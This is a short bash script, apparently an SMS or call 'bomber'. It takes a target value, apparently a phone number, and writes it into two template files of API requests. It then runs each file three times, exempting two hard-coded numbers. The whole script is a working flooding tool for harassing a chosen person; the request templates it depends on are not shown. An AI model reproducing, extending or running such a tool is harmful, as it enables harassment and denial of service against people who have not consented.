target=$1

bomb(){
rm headapis
rm tailapis

PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cd ..
while read a; do
    echo ${a//€shushhi/$target}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$target}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..3}
do bash headapis
done

for i in {1..3}
do bash tailapis
done

exit
}

if [ "$target" -eq "790933131" ] || [ "$target" -eq "7808850437" ]
then
        echo "cant bomb"
        exit
else
        echo "started bombing"
        bomb
fi
